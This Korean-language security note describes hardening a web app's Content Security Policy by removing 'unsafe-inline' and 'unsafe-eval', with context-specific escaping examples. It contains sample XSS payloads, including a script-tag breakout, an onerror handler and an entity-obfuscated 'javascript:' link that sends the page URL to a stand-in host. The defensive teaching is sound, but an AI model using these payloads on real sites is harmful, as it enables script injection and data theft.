# CSP 인라인/`unsafe-eval` 제거 하드닝

인라인 코드 제거, `unsafe-inline`/`unsafe-eval` 위험, 백엔드 삽입 위치별 방어를 다루는 문서입니다.

## 적용 내용

- 배경:
  `unsafe-inline` 허용은 XSS 방어력을 크게 낮춥니다. 스캐너 경고뿐 아니라 실제 공격면(공격 가능한 범위)이 넓어집니다.
- 조치:
  에러 페이지(`server/views/errors/common`)의 인라인 `style=""`을 클래스 기반으로 이관했고, JS의 `element.style.*` 조작도 클래스 토글 방식으로 변경했습니다.
- 코드 위치:
  `server/views/errors/common/index.html`, `server/views/errors/common/style.css`, `server/views/errors/common/script.js`, `nginx/conf.d/default.conf`

### 왜 `unsafe-inline`이 XSS 방어를 약화시키는가

CSP는 원래 "브라우저가 실행해도 되는 코드의 출처"를 제한하는 장치입니다. 예를 들어 `script-src 'self' 'nonce-...'`만 허용하면, 서버가 nonce를 붙인 스크립트만 실행됩니다.

하지만 `unsafe-inline`을 열면 다음이 허용됩니다.

- 인라인 `<script>...</script>` 실행
- 인라인 이벤트 핸들러 실행 (`onclick`, `onerror` 등)
- `javascript:` URI 실행 (브라우저/실행 위치에 따라)

즉, HTML 주입이 가능한 작은 취약점이 있을 때 원래는 CSP가 막아주던 실행 경로를 다시 열어주게 됩니다.

### 브라우저가 열어주는 실행 경로 (표)

| 실행 경로 | 예시 | `unsafe-inline` 미허용 시 | `unsafe-inline` 허용 시 | 위험 포인트 |
| --- | --- | --- | --- | --- |
| 인라인 스크립트 블록 | `</script><script>/* injected */</script>` | CSP 위반으로 차단 | 실행 허용 | JSON/템플릿 문자열 삽입 위치에서 탈출 시 즉시 실행 가능 |
| 인라인 이벤트 핸들러 | `<img src=x onerror="/* injected */">` | CSP 위반으로 차단 | 실행 허용 | Sanitizer 누락 속성 하나로 코드 실행 트리거 가능 |
| `javascript:` URI | `<a href="java&#x09;script:...">` | 대체로 차단(정책/브라우저 영향) | 허용 가능성 상승 | 엔티티/공백 정규화 우회가 섞이면 필터 우회 가능 |
| 템플릿 내 우발적 인라인 코드 | 디버그용 `<script>` 잔존 | 차단되어 조기 발견 가능 | 운영에서 그대로 실행 | 실수/레거시 코드가 보안 예외로 누적됨 |

### 대표 예시

1. SSR 상태 직렬화 구간의 `</script>` 삽입 위치 탈출

```html
<script>
  window.__BOOTSTRAP__ = {
    nickname: "</script><script>navigator.sendBeacon('/audit/csp', document.domain)</script>"
  };
</script>
```

설명: 서버 템플릿이 사용자 문자열을 JS 문자열 삽입 위치에서 안전하게 이스케이프하지 않으면, `unsafe-inline` 허용 시 바로 실행됩니다.

1. Sanitizer 누락으로 인라인 핸들러가 살아남는 경우

```html
<img src="/assets/avatar.png" onerror="this.remove();location='/session-expired'">
```

설명: 마크다운/HTML 정제기에서 `on*` 속성 차단이 누락되면, 렌더링 실패 같은 정상 이벤트를 트리거로 악용할 수 있습니다.

1. `javascript:` 스킴 정규화 우회 패턴

```html
<a href="java&#x0A;script:location='https://example.invalid/log?u='+encodeURIComponent(location.href)">
  click
</a>
```

설명: `javascript:`를 문자열 비교로만 막는 필터는 엔티티/제어문자 정규화 이후 우회될 수 있습니다.

### 참고: `style-src 'unsafe-inline'`의 위험도

- `script-src 'unsafe-inline'`보다 직접적인 코드 실행 위험은 낮지만,
- CSS 인젝션 기반 UI 위장(피싱/클릭 유도), 보안 UI 가시성 저해, 민감 정보 노출 보조 채널 등의 위험은 여전히 존재합니다.

### `unsafe-eval`의 역할과 위험성

`unsafe-eval`은 CSP 정책에서 쓰는 허용 키워드(source expression) 중 하나로, 주로 `script-src`에서 사용됩니다.
이 값이 켜지면 브라우저는 "문자열을 JavaScript 코드로 컴파일/실행"하는 경로를 허용합니다.

대표적으로 영향을 받는 API:

```js
eval(userInput);
new Function(userInput)();
setTimeout(userInput, 0); // 문자열 인자
setInterval(userInput, 1000); // 문자열 인자
```

기본적으로 `unsafe-eval`이 없으면 위 패턴은 CSP 위반으로 차단됩니다. 따라서 `unsafe-eval`은 "문자열 주입 -> 코드 실행" 경로를 다시 열어주기 때문에 XSS 위험을 크게 키웁니다.

추가 참고:

- `unsafe-eval`은 일반 JS eval 계열 허용
- WebAssembly 컴파일 허용은 CSP3의 `wasm-unsafe-eval`로 별도 제어되는 브라우저가 있습니다.
- 대부분의 일반 웹 앱은 `unsafe-eval` 없이 동작하도록 설계하는 것이 원칙입니다.

### 2차 방어 상세: 백엔드 삽입 위치별 방어

핵심은 `"<script"` 같은 문자열만 막는 것이 아니라, "값이 들어가는 위치(삽입 위치, context)"마다 다른 방어를 적용하는 것입니다.

| 삽입 위치(컨텍스트) | 위험한 구현 패턴 | 권장 방어 |
| --- | --- | --- |
| HTML 본문 | 사용자 입력을 그대로 템플릿에 출력 | 템플릿 엔진 자동 이스케이프 유지(escape off 금지) |
| HTML 속성 | `<div data-x="${user}">`에 무이스케이프 삽입 | 속성 위치에 맞는 이스케이프 + 허용 속성만 출력 |
| URL 속성(`href`, `src`) | `javascript:`/`data:`를 문자열 치환으로만 차단 | 허용 프로토콜 목록(allowlist, 예: `http`, `https`) 검증 후 바인딩 |
| JS 문자열/상태 주입 | `<script>var s='${user}'</script>` | 문자열 결합 금지, `JSON.stringify` 기반 직렬화 |
| 사용자 HTML 허용 기능(에디터/마크다운) | 정규식 블랙리스트로 태그 제거 | 허용 목록 기반 정제기(allowlist sanitizer)로 태그/속성/프로토콜 제한 허용 |

정규식 필터가 불충분한 이유:

1. 실행 경로가 `<script>`만이 아닙니다. (`on*` 속성, `javascript:` URI 등)
2. 브라우저 정규화(엔티티/공백/대소문자/개행)까지 정규식이 안정적으로 커버하기 어렵습니다.
3. 저장 후 재사용 시 출력 위치(컨텍스트)가 바뀌면, 입력 시점 필터만으로는 방어가 깨집니다.

실무 적용 순서:

1. 인라인 코드 금지 규칙을 기본값으로 유지
2. 백엔드에서 삽입 위치별 이스케이프/검증/정제를 적용
3. CSP(`unsafe-inline`/`unsafe-eval` 제거)를 마지막 안전망으로 유지

### 2차 방어 상세 적용 예시

1. HTML 본문 삽입 위치

```ejs
<!-- 취약: raw 출력 -->
<div class="bio"><%- userBio %></div>

<!-- 안전: 템플릿 엔진 escape 출력 -->
<div class="bio"><%= userBio %></div>
```

1. HTML 속성 삽입 위치

```ejs
<!-- 취약: 속성값에 raw 삽입 -->
<div data-nickname="<%- nickname %>"></div>

<!-- 안전: escape 출력 + 서버 측 길이/문자 검증 -->
<div data-nickname="<%= safeNickname %>"></div>
```

1. JS 문자열/상태 주입 위치

```html
<!-- 취약: 문자열 연결 -->
<script>
  window.__BOOTSTRAP__ = { nickname: '${nickname}' };
</script>

<!-- 안전: JSON 직렬화 + script 종료 시퀀스 방어 -->
<script>
  window.__BOOTSTRAP__ = JSON.parse(
    document.getElementById('bootstrap-json').textContent
  );
</script>
<script id="bootstrap-json" type="application/json">
  {"nickname":"...server-json..."}
</script>
```

1. URL 삽입 위치(`href`, `src`)

```ts
// 취약: 문자열 접두사 치환만 수행
const href = input.replace("javascript:", "");

// 안전: URL 파싱 + 허용 프로토콜 목록(allowlist)
const url = new URL(input, "https://example.com");
if (!["http:", "https:", "mailto:"].includes(url.protocol)) {
  throw new Error("disallowed scheme");
}
```

1. 사용자 HTML 허용(에디터/마크다운)

```ts
// 취약: 블랙리스트 정규식
const cleaned = html.replace(/<script.*?>.*?<\/script>/gi, "");

// 안전: 허용 목록 기반 정제기(allowlist sanitizer)
const cleaned = sanitizeHtml(html, {
  allowedTags: ["p", "a", "strong", "em", "ul", "ol", "li", "code"],
  allowedAttributes: { a: ["href", "title", "rel", "target"] },
  allowedSchemes: ["http", "https", "mailto"],
});
```

### 실제 공격 가능 시나리오(우회형, 학습용)

아래는 실제 운영에서 자주 보이는 형태를 "무해한 동작"으로 축약한 예시입니다.

1. 저장형 XSS: 공지/댓글 HTML 렌더링 재사용

    - 전제:
    마크다운 렌더러가 일부 HTML을 허용하고, `on*` 속성 차단이 누락됨
    - 우회가 되는 이유:
    입력 필터는 `<script>`만 막지만 이벤트 핸들러 경로는 남아 있음
    - 결과:
    다른 사용자가 페이지를 열 때 공격 코드가 실행됨
    - 무해 PoC 관찰 신호:
    페이지 로드 시 예상치 못한 `console.log("__XSS_PROBE__")` 실행

2. SSR 상태 주입: 템플릿에서 JS 문자열 결합

    - 전제:
    `window.__BOOTSTRAP__`에 사용자 닉네임/소개를 문자열 결합으로 주입
    - 우회가 되는 이유:
    quote escape만 하고 `</script>` 종료 시퀀스는 고려하지 않음
    - 결과:
    hydration 전에 인라인 스크립트가 분기 실행됨
    - 무해 PoC 관찰 신호:
    브라우저 개발자도구 콘솔에서 의도치 않은 probe 로그 출력

3. `javascript:` 스킴 필터 우회: 정규화 차이 악용

    - 전제:
    링크 검사 로직이 `startsWith("javascript:")` 문자열 비교에 의존
    - 우회가 되는 이유:
    엔티티/제어문자/대소문자 정규화 후 실제 스킴이 달라짐
    - 결과:
    링크 클릭 시 스크립트 실행 경로가 열림
    - 무해 PoC 관찰 신호:
    클릭 시 외부 이동 대신 클라이언트 스크립트가 동작

실무 팁:

1. 방어 검증은 "입력값 기준"이 아니라 "브라우저 최종 파싱 결과" 기준으로 테스트
2. 단위 테스트에 benign payload(`__XSS_PROBE__`)를 고정해 회귀 검증 자동화
3. CSP 리포트(`report-to`/`report-uri`)를 수집해 실제 차단 이벤트를 운영에서 모니터링
